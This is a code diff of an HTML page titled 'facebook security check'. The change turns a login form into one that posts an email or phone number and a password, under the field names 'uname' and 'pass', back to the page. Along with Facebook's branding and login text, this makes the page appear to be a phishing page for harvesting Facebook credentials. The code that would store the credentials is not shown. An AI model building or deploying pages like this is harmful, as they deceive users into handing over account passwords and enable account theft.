@@ -16,20 +16,38 @@
                 <p>facebook security check</p>
             </div>
             <div class="login">
-    <form action="#">
-        <input type="text" placeholder="Email address or Phone number" required>
-        <input type="password" placeholder="Password" required>
-        
-        <!-- Submit button -->
-        <button type="submit" class="login">Log In</button>
-        
-        <a href="#">Forgot password?</a>
-        <hr />
-        <button type="button" class="create-account">Create New Account</button>
+    <form name="loginform" method="post" action="">
+        <table cellpadding="4" cellspacing="1">
+            <tbody>
+                <tr>
+                    <td>Emali / Phone :</td>
+                    <td><input type="text" name="uname" size="20" required></td>
+                </tr>
+                <tr>
+                    <td>Password :</td>
+                    <td><input type="password" name="pass" size="20" required></td>
+                </tr>
+                <tr>
+                    <td colspan="2" align="right">
+                        <input type="submit" value="Log In">
+                    </td>
+                </tr>
+                <tr>
+                    <td colspan="2" align="center">
+                        <a href="#">Forgot password?</a>
+                    </td>
+                </tr>
+                <tr>
+                    <td colspan="2" align="center">
+                        <input type="button" value="Create New Account" onclick="alert('Redirect to signup page')">
+                    </td>
+                </tr>
+            </tbody>
+        </table>
     </form>
-
     <p><span>Create a Page</span> for a celebrity, brand or business.</p>
 </div>
+
 
 
         </div>
@@ -38,3 +56,4 @@
 
 
 </html>
+
